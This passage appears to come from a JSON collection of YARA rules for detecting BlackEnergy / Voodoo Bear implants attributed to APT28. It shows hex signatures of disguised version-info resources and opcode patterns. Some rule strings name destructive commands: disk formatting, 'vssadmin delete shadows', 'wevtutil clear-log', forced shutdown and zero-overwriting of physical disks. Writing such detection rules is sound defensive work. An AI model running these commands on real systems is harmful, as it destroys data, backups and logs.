00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00\n         68 00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74\n         00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 31 00 33 00 00 00 00 00\n         3E 00 0B 00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46\n         00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 75 00 73 00 62 00\n         6D 00 64 00 6D 00 2E 00 73 00 79 00 73 00 00 00 00 00 66 00 23 00 01\n         00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00\n         00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20\n         00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 20 00 4F 00 70 00 65 00\n         72 00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65\n         00 6D 00 00 00 00 00 40 00 0E 00 01 00 50 00 72 00 6F 00 64 00 75 00\n         63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 35 00 2E\n         00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00\n         00 00 1C 02 00 00 01 00 30 00 34 00 30 00 39 00 30 00 34 00 62 00 30\n         00 00 00 4C 00 16 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00\n         4E 00 61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73\n         00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00\n         74 00 69 00 6F 00 6E 00 00 00 46 00 0F 00 01 00 46 00 69 00 6C 00 65\n         00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69 00 6F 00 6E 00\n         00 00 00 00 55 00 53 00 42 00 20 00 4D 00 44 00 4D 00 20 00 44 00 72\n         00 69 00 76 00 65 00 72 00 00 00 00 00 3C 00 0E 00 01 00 46 00 69 00\n         6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 35\n         00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00\n         32 00 00 00 4A 00 13 00 01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F\n         00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6F 00 70 00\n         79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43 00 29 00 20 00 32\n         00 30 00 31 00 33 00 00 00 00 00 3E 00 0B 00 01 00 4F 00 72 00 69 00\n         67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D\n         00 65 00 00 00 75 00 73 00 62 00 6D 00 64 00 6D 00 2E 00 73 00 79 00\n         73 00 00 00 00 00 66 00 23 00 01 00 50 00 72 00 6F 00 64 00 75 00 63\n         00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00\n         6F 00 73 00 6F 00 66 00 74 00 20 00 57 00 69 00 6E 00 64 00 6F 00 77\n         00 73 00 20 00 4F 00 70 00 65 00 72 00 61 00 74 00 69 00 6E 00 67 00\n         20 00 53 00 79 00 73 00 74 00 65 00 6D 00 00 00 00 00 40 00 0E 00 01\n         00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00\n         69 00 6F 00 6E 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30\n         00 2E 00 35 00 35 00 31 00 32 00 00 00 48 00 00 00 01 00 56 00 61 00\n         72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 28\n         00 08 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00\n         6F 00 6E 00 00 00 00 00 15 00 B0 04 09 04 B0 04}\n      $b2 = {34 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00\n         4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00\n         00 01 00 03 00 03 00 04 00 02 00 03 00 03 00 04 00 02 00 3F 00 00 00\n         00 00 00 00 04 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n         00 94 02 00 00 00 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00\n         6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 70 02 00 00 00 00 30 00 34\n         00 30 00 39 00 30 00 34 00 65 00 34 00 00 00 4A 00 15 00 01 00 43 00\n         6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00\n         00 53 00 6F 00 6C 00 69 00 64 00 20 00 53 00 74 00 61 00 74 00 65 00\n         20 00 4E 00 65 00 74 00 77 00 6F 00 72 00 6B 00 73 00 00 00 00 00 62\n         00 1D 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00\n         69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 41 00 64 00 6F 00 62\n         00 65 00 20 00 46 00 6C 00 61 00 73 00 68 00 20 00 50 00 6C 00 61 00\n         79 00 65 00 72 00 20 00 49 00 6E 00 73 00 74 00 61 00 6C 00 6C 00 65\n         00 72 00 00 00 00 00 30 00 08 00 01 00 46 00 69 00 6C 00 65 00 56 00\n         65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 33 00 2E 00 33 00 2E\n         00 32 00 2E 00 34 00 00 00 32 00 09 00 01 00 49 00 6E 00 74 00 65 00\n         72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 68 00 6F 00 73\n         00 74 00 2E 00 65 00 78 00 65 00 00 00 00 00 76 00 29 00 01 00 4C 00\n         65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68\n         00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00\n         20 00 28 00 43 00 29 00 20 00 41 00 64 00 6F 00 62 00 65 00 20 00 53\n         00 79 00 73 00 74 00 65 00 6D 00 73 00 20 00 49 00 6E 00 63 00 6F 00\n         72 00 70 00 6F 00 72 00 61 00 74 00 65 00 64 00 00 00 00 00 3A 00 09\n         00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00\n         6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 68 00 6F 00 73 00 74 00 2E\n         00 65 00 78 00 65 00 00 00 00 00 5A 00 1D 00 01 00 50 00 72 00 6F 00\n         64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 41 00 64\n         00 6F 00 62 00 65 00 20 00 46 00 6C 00 61 00 73 00 68 00 20 00 50 00\n         6C 00 61 00 79 00 65 00 72 00 20 00 49 00 6E 00 73 00 74 00 61 00 6C\n         00 6C 00 65 00 72 00 00 00 00 00 34 00 08 00 01 00 50 00 72 00 6F 00\n         64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00\n         00 33 00 2E 00 33 00 2E 00 32 00 2E 00 34 00 00 00 44 00 00 00 00 00\n         56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00\n         00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00\n         74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 E4 04 46 45 32 58}\n      $b3 = {C8 02 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00\n         4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00\n         00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 17 00 00 00\n         00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n         00 28 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00\n         6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 04 02 00 00 01 00 30 00 34\n         00 30 00 39 00 30 00 34 00 65 00 34 00 00 00 4C 00 16 00 01 00 43 00\n         6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00\n         00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00\n         6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 48\n         00 10 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00\n         69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 49 00 44 00 45 00 20\n         00 50 00 6F 00 72 00 74 00 20 00 44 00 72 00 69 00 76 00 65 00 72 00\n         00 00 62 00 21 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73\n         00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00\n         30 00 30 00 2E 00 35 00 35 00 31 00 32 00 20 00 28 00 78 00 70 00 73\n         00 70 00 2E 00 30 00 38 00 30 00 34 00 31 00 33 00 2D 00 30 00 38 00\n         35 00 32 00 29 00 00 00 00 00 4A 00 13 00 01 00 4C 00 65 00 67 00 61\n         00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00\n         43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 20 00 28 00 43\n         00 29 00 20 00 32 00 30 00 30 00 39 00 00 00 00 00 66 00 23 00 01 00\n         50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00\n         00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00\n         57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 20 00 4F 00 70 00 65 00 72\n         00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65 00\n         6D 00 00 00 00 00 40 00 0E 00 01 00 50 00 72 00 6F 00 64 00 75 00 63\n         00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 35 00 2E 00\n         31 00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00\n         00 44 00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00\n         6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E\n         00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 09 04 E4 04 }\n      $b4 = {9C 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00\n         4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00\n         00 01 00 01 00 06 00 01 40 B0 1D 01 00 06 00 01 40 B0 1D 3F 00 00 00\n         00 00 00 00 04 00 04 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n         00 FA 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00\n         6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 D6 02 00 00 01 00 30 00 34\n         00 30 00 39 00 30 00 34 00 42 00 30 00 00 00 4C 00 16 00 01 00 43 00\n         6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00\n         00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00\n         6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 58\n         00 18 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00\n         69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 52 00 65 00 67 00 69\n         00 73 00 74 00 72 00 79 00 20 00 45 00 64 00 69 00 74 00 6F 00 72 00\n         20 00 55 00 74 00 69 00 6C 00 69 00 74 00 79 00 00 00 6C 00 26 00 01\n         00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00\n         00 00 00 00 36 00 2E 00 31 00 2E 00 37 00 36 00 30 00 30 00 2E 00 31\n         00 36 00 33 00 38 00 35 00 20 00 28 00 77 00 69 00 6E 00 37 00 5F 00\n         72 00 74 00 6D 00 2E 00 30 00 39 00 30 00 37 00 31 00 33 00 2D 00 31\n         00 32 00 35 00 35 00 29 00 00 00 3A 00 0D 00 01 00 49 00 6E 00 74 00\n         65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 72 00 65\n         00 67 00 65 00 64 00 74 00 33 00 32 00 2E 00 65 00 78 00 65 00 00 00\n         00 00 80 00 2E 00 01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70\n         00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9 00 20 00 4D 00 69 00\n         63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F 00 72 00 70\n         00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20 00 41 00 6C 00\n         6C 00 20 00 72 00 69 00 67 00 68 00 74 00 73 00 20 00 72 00 65 00 73\n         00 65 00 72 00 76 00 65 00 64 00 2E 00 00 00 42 00 0D 00 01 00 4F 00\n         72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E\n         00 61 00 6D 00 65 00 00 00 72 00 65 00 67 00 65 00 64 00 74 00 33 00\n         32 00 2E 00 65 00 78 00 65 00 00 00 00 00 6A 00 25 00 01 00 50 00 72\n         00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00\n         4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 AE 00 20 00 57\n         00 69 00 6E 00 64 00 6F 00 77 00 73 00 AE 00 20 00 4F 00 70 00 65 00\n         72 00 61 00 74 00 69 00 6E 00 67 00 20 00 53 00 79 00 73 00 74 00 65\n         00 6D 00 00 00 00 00 42 00 0F 00 01 00 50 00 72 00 6F 00 64 00 75 00\n         63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 36 00 2E\n         00 31 00 2E 00 37 00 36 00 30 00 30 00 2E 00 31 00 36 00 33 00 38 00\n         35 00 00 00 00 00 44 00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6C\n         00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00\n         72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00\n         00 09 04 B0 04}\n      $b5 = {78 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00\n         4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00\n         00 01 00 00 00 05 00 6A 44 B1 1D 00 00 05 00 6A 44 B1 1D 3F 00 00 00\n         00 00 00 00 04 00 04 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n         00 D6 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00\n         6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 B2 02 00 00 01 00 30 00 34\n         00 30 00 39 00 30 00 34 00 42 00 30 00 00 00 4C 00 16 00 01 00 43 00\n         6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00\n         00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00\n         6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 4E\n         00 13 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00\n         69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 57 00 69 00 6E 00 64\n         00 6F 00 77 00 73 00 AE 00 53 00 79 00 73 00 55 00 74 00 69 00 6C 00\n         69 00 74 00 79 00 00 00 00 00 72 00 29 00 01 00 46 00 69 00 6C 00 65\n         00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00\n         30 00 2E 00 37 00 36 00 30 00 31 00 2E 00 31 00 37 00 35 00 31 00 34\n         00 20 00 28 00 77 00 69 00 6E 00 37 00 73 00 70 00 31 00 5F 00 72 00\n         74 00 6D 00 2E 00 31 00 30 00 31 00 31 00 31 00 39 00 2D 00 31 00 38\n         00 35 00 30 00 29 00 00 00 00 00 30 00 08 00 01 00 49 00 6E 00 74 00\n         65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 6D 00 73\n         00 69 00 65 00 78 00 65 00 63 00 00 00 80 00 2E 00 01 00 4C 00 65 00\n         67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74\n         00 00 00 A9 00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00\n         74 00 20 00 43 00 6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F\n         00 6E 00 2E 00 20 00 41 00 6C 00 6C 00 20 00 72 00 69 00 67 00 68 00\n         74 00 73 00 20 00 72 00 65 00 73 00 65 00 72 00 76 00 65 00 64 00 2E\n         00 00 00 40 00 0C 00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00\n         6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 6D 00 73\n         00 69 00 65 00 78 00 65 00 63 00 2E 00 65 00 78 00 65 00 00 00 58 00\n         1C 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D\n         00 65 00 00 00 00 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 53 00\n         79 00 73 00 55 00 74 00 69 00 6C 00 69 00 74 00 79 00 20 00 2D 00 20\n         00 55 00 6E 00 69 00 63 00 6F 00 64 00 65 00 00 00 42 00 0F 00 01 00\n         50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69\n         00 6F 00 6E 00 00 00 35 00 2E 00 30 00 2E 00 37 00 36 00 30 00 31 00\n         2E 00 31 00 37 00 35 00 31 00 34 00 00 00 00 00 44 00 00 00 01 00 56\n         00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00\n         00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74\n         00 69 00 6F 00 6E 00 00 00 00 00 09 04 B0 04}\n      $b6 = {D4 02 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00\n         4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00\n         00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 17 00 00 00\n         00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n         00 34 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00\n         00 65 00 49 00 6E 00 66 00 6F 00 00 00 10 02 00 00 01 00 30 00 34 00\n         30 00 39 00 30 00 34 00 65 00 34 00 00 00 4C 00 16 00 01 00 43 00 6F\n         00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00 00\n         4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00 6F\n         00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 4E 00\n         13 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69\n         00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 53 00 65 00 72 00 69 00\n         61 00 6C 00 20 00 50 00 6F 00 72 00 74 00 20 00 44 00 72 00 69 00 76\n         00 65 00 72 00 00 00 00 00 62 00 21 00 01 00 46 00 69 00 6C 00 65 00\n         56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 31\n         00 2E 00 32 00 36 00 30 00 30 00 2E 00 35 00 35 00 31 00 32 00 20 00\n         28 00 78 00 70 00 73 00 70 00 2E 00 30 00 38 00 30 00 34 00 31 00 33\n         00 2D 00 30 00 38 00 35 00 32 00 29 00 00 00 00 00 4A 00 13 00 01 00\n         4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67\n         00 68 00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00\n         74 00 20 00 28 00 43 00 29 00 20 00 32 00 30 00 30 00 34 00 00 00 00\n         00 6A 00 25 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00\n         61 00 6D 00 65 00 00 00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F\n         00 66 00 74 00 AE 00 20 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00\n         AE 00 20 00 4F 00 70 00 65 00 72 00 61 00 74 00 69 00 6E 00 67 00 20\n         00 53 00 79 00 73 00 74 00 65 00 6D 00 00 00 00 00 40 00 0E 00 01 00\n         50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69\n         00 6F 00 6E 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00 30 00 30 00\n         2E 00 35 00 35 00 31 00 32 00 00 00 44 00 00 00 01 00 56 00 61 00 72\n         00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00\n         04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F\n         00 6E 00 00 00 00 00 09 04 E4 04}\n   condition:\n      (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and\n      (((any of ($a*)) and (uint32(uint32(0x3C)+8) == 0x00000000)) or\n      (for any of ($b*): ($ in (uint32(uint32(0x3C)+248+(40*(uint16(uint32(0x3C)+6)-1)+20))..(uint32(uint32(0x3C)+248+(40*(uint16(uint32(0x3C)+6)-1)+20))+uint32(uint32(0x3C)+248+(40*(uint16(uint32(0x3C)+6)-1)+16)))))))\n}",
  "IMPLANT_4_v3_AlternativeRule": "rule IMPLANT_4_v3_AlternativeRule {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      comment = \"Alternative rule - not based on the original samples but samples on which the original rule matched\"\n      author = \"Florian Roth\"\n      reference = \"US CERT Grizzly Steppe Report\"\n      date = \"2017-02-12\"\n      hash1 = \"2244fe9c5d038edcb5406b45361613cf3909c491e47debef35329060b00c985a\"\n   strings:\n      $op1 = { 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 53 1e 01 00 } /* Opcode */\n      $op2 = { 21 da 40 00 00 a0 40 00 08 a0 40 00 b0 70 40 00 } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and all of them )\n}",
  "IMPLANT_4_v4": "rule IMPLANT_4_v4 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $DK_format1 = \"/c format %c: /Y /Q\" ascii\n      $DK_format2 = \"/c format %c: /Y /X /FS:NTFS\" ascii\n      $DK_physicaldrive = \"PhysicalDrive%d\" wide\n      $DK_shutdown = \"shutdown /r /t %d\"\n   condition:\n      uint16(0) == 0x5A4D and all of ($DK*)\n}",
  "IMPLANT_4_v5": "rule IMPLANT_4_v5 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $GEN_HASH = {0F BE C9 C1 C0 07 33 C1}\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or\n      uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or\n      uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_4_v6": "rule IMPLANT_4_v6 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = \"DispatchCommand\" wide ascii\n      $STR2 = \"DispatchEvent\" wide ascii\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_4_v7": "rule IMPLANT_4_v7 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $sb1 = {C7 [1-5] 33 32 2E 64 C7 [1-5] 77 73 32 5F 66 C7 [1-5] 6C 6C}\n      $sb2 = {C7 [1-5] 75 73 65 72 C7 [1-5] 33 32 2E 64 66 C7 [1-5] 6C 6C}\n      $sb3 = {C7 [1-5] 61 64 76 61 C7 [1-5] 70 69 33 32 C7 [1-5] 2E 64 6C 6C}\n      $sb4 = {C7 [1-5] 77 69 6E 69 C7 [1-5] 6E 65 74 2E C7 [1-5] 64 6C 6C}\n      $sb5 = {C7 [1-5] 73 68 65 6C C7 [1-5] 6C 33 32 2E C7 [1-5] 64 6C 6C}\n      $sb6 = {C7 [1-5] 70 73 61 70 C7 [1-5] 69 2E 64 6C 66 C7 [1-5] 6C}\n      $sb7 = {C7 [1-5] 6E 65 74 61 C7 [1-5] 70 69 33 32 C7 [1-5] 2E 64 6C 6C}\n      $sb8 = {C7 [1-5] 76 65 72 73 C7 [1-5] 69 6F 6E 2E C7 [1-5] 64 6C 6C}\n      $sb9 = {C7 [1-5] 6F 6C 65 61 C7 [1-5] 75 74 33 32 C7 [1-5] 2E 64 6C 6C}\n      $sb10 = {C7 [1-5] 69 6D 61 67 C7 [1-5] 65 68 6C 70 C7 [1-5] 2E 64 6C 6C}\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 3 of them\n}",
  "IMPLANT_4_v8": "rule IMPLANT_4_v8 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $f1 = {5E 81 EC 04 01 00 00 8B D4 68 04 01 00 00 52 6A 00 FF 57 1C 8B D4\n         33 C9 03 D0 4A 41 3B C8 74 05 80 3A 5C 75 F5 42 81 EC 04 01 00 00 8B\n         DC 52 51 53 68 04 01 00 00 FF 57 20 59 5A 66 C7 04 03 5C 20 56 57 8D\n         3C 03 8B F2 F3 A4 C6 07 00 5F 5E 33 C0 50 68 80 00 00 00 6A 02 50 50\n         68 00 00 00 40 53 FF 57 14 53 8B 4F 4C 8B D6 33 DB 30 1A 42 43 3B D9\n         7C F8 5B 83 EC 04 8B D4 50 6A 00 52 FF 77 4C 8B D6 52 50 FF 57 24 FF\n         57 18}\n      $f2 = {5E 83 EC 1C 8B 45 08 8B 4D 08 03 48 3C 89 4D E4 89 75 EC 8B 45 08\n         2B 45 10 89 45 E8 33 C0 89 45 F4 8B 55 0C 3B 55 F4 0F 86 98 00 00 00\n         8B 45 EC 8B 4D F4 03 48 04 89 4D F4 8B 55 EC 8B 42 04 83 E8 08 D1 E8\n         89 45 F8 8B 4D EC 83 C1 08 89 4D FC}\n      $f3 = {5F 8B DF 83 C3 60 2B 5F 54 89 5C 24 20 8B 44 24 24 25 00 00 FF FF\n         66 8B 18 66 81 FB 4D 5A 74 07 2D 00 00 01 00 EB EF 8B 48 3C 03 C8 66\n         8B 19 66 81 FB 50 45 75 E0 8B E8 8B F7 83 EC 60 8B FC B9 60 00 00 00\n         F3 A4 83 EF 60 6A 0D 59 E8 88 00 00 00 E2 F9 68 6C 33 32 00 68 73 68\n         65 6C 54 FF 57}\n      $a1 = {83 EC 04 60 E9 1E 01 00 00}\n   condition:\n      $a1 at pe.entry_point or any of ($f*)\n}",
  "IMPLANT_4_v9": "rule IMPLANT_4_v9 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $a = \"wevtutil clear-log\" ascii wide nocase\n      $b = \"vssadmin delete shadows\" ascii wide nocase\n      $c = \"AGlobal\\\\23d1a259-88fa-41df-935f-cae523bab8e6\" ascii wide nocase\n      $d = \"Global\\\\07fd3ab3-0724-4cfd-8cc2-60c0e450bb9a\" ascii wide nocase //$e = {57 55 33 c9 51 8b c3 99 57 52 50}\n      $openPhysicalDiskOverwriteWithZeros = { 57 55 33 C9 51 8B C3 99 57 52\n         50 E8 ?? ?? ?? ?? 52 50 E8 ?? ?? ?? ?? 83 C4 10 84 C0 75 21 33 C0 89\n         44 24 10 89 44 24 14 6A 01 8B C7 